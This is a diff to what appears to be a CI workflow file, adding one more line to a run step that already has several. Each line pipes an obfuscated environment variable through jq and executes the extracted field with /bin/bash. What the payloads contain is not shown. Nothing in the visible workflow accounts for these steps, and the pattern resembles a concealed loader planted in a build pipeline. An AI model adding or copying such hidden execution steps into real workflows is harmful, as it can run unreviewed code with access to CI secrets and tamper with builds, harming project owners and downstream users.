@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$czpu0" | jq -r .kj9 | /bin/bash
           printf '%s' "$v5517" | jq -r .q9 | /bin/bash
           echo $ye02294 | jq -r .y7 | /bin/bash
+          echo $wj9 | jq -r .vq66 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
